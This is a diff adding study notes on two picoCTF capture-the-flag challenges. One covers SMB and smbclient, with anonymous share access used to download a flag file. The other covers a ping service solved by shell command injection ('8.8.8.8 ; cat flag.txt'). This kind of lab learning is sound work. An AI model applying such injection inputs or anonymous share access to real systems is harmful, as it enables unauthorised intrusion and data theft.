@@ -1,0 +1,92 @@
+4. Printer Shares:
+    
+    -Oops! Someone accidentally sent an important file to a network printer can you retrieve it from the print server?
+    
+    -knowing how SMB protocol works would be helpful, smbclient and smbutil are good tools
+    
+    - SMB protocol:
+        - Server Message Block - the language used to talk to each other to read/open/write/delete files remotely and access shared printers
+        - port 445 SMB server(Samba on Linux) the path looks like \\server\sharename
+        - Server = The machine the owns the folder/printer.  Role was played by Samba software,  Client = the machine that connects and browses/uses that share. tools like smbclient
+        - What are the smbclient methods in SMB protocol?
+        - Connection Syntax:
+            - smbclient -L //<target> -N
+                - -N = no password,  -L = List available shares <target> = IP address
+            - smbclient -L //<target> -U <user>%<password> -p <portnumber>
+                - <password> specifies password of user
+            - smbclient //<target>/<share> -U <username> -c "commands”
+                - -c used to specific commands in “” to execute non interactively
+            - smbclient //<target>/<share> -U <username>%<password> -m <SMB2/3 or NT1>
+                - <share> = folder name for accessing
+                - -m maximum protocol that the client is willing to negotiate
+                - starts an interactive session with smb:\> command prompt.
+        - In-Session Commands:
+            - Navigation - ls, cd <dir>, lcd <dir>, pwd
+                - where lcd = change local directory(where downloads go)
+            - Downloading files - get <filename>, mget <pattern>
+                - get for single file and mget for multiple files
+            - Uploading files - put <filename>, mput <pattern>
+                - put for single file and mput for multiple files
+            - recurse ON                  
+            prompt OFF                     
+            mget *
+                - recurse = look all subdirectories, prompt = doesnot prompt for confirmation, * means select all
+            - File/Directory Management - mkdir <dirname>, rmdir <dirname>, del <filename>, rename <old> <new>
+            - Info/Permissions - dir, allinfo <filename>
+                - dir displays all files and folders in current directory
+                - allinfo displays file’s detailed metadata
+            - Printer-related - print <filename>, queue
+                - print is used to send file to shared printer
+                - queue is used to view print queue
+            - Exiting - exit, quit and Ctrl + D
+    - Approach
+        - nc -vz mysterious-sea.picoctf.net 64500 (gave IP 3.130.79.223)
+        - smbclient -L //3.130.79.223 -N -p 64500
+        
+        !image.png
+        
+        - smbclient //3.130.79.233/shares -N -p 64500 (gave smb: \>)
+        - smb: \> ls (showed flag.txt)
+        - smb: \> get flag.txt (downloaded file flag.txt)
+        - smb: \> exit
+        - cat flag.txt (gave flag)
+5. ping-cmd:
+    
+    -Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
+    -You can connect to the service here **`nc mysterious-sea.picoctf.net 64435`**
+    -Hint: The program uses a shell command behind the scenes.
+    
+    - Ping:
+        - used to check connectivity with a device using ICMP Echo Request and ICMP Echo Reply, measures RTT.
+        - ping [options] <destination>
+        - [options]
+            - -c <number> (sends number of packets)
+            - -i <time> (interval in seconds between packets)
+            - -s <size> (sets packets size in bytes)
+            - -t <time> (set TTL in number of hopes)
+            - -f (flood ping, needs root)
+            - -W <time> (sets time limit for the ping in seconds)
+            - -4/-6 (force IPv4/IPv6)
+            - -q (only summaries stats)
+    - To use multiple commands in a single line
+        - Unconditional Execution( ; )
+            - command1 ; command 2 ; command 3
+            - executes all commands
+        - Conditional Success Execution(&&)
+            - command1 && command2
+            - it executes command2 when command1 succeed
+        - Conditional Failure Execution( || )
+            - command1 || command2
+            - it executes command2 if command1 fails
+        - Passing Output to Another Command( | )
+            - command1 | command2
+            - passes output of command1 to command2
+        - Running a Command Inside Another( $(…) )
+            - command1 $(command2) or command1 -$(command2)
+            - first line uses the command2 output as argument for command1
+            - second line uses the command2 output as option for command1
+    - Approach:
+        - nc mysterious-sea.picoctf.net 54837 [displayed Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): ]
+        - 8.8.8.8 ; ls (displayed flag.txt, script.sh)
+        - nc mysterious-sea.picoctf.net 54837 [displayed Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): ]
+        - 8.8.8.8 ; cat flag.txt (gave flag)
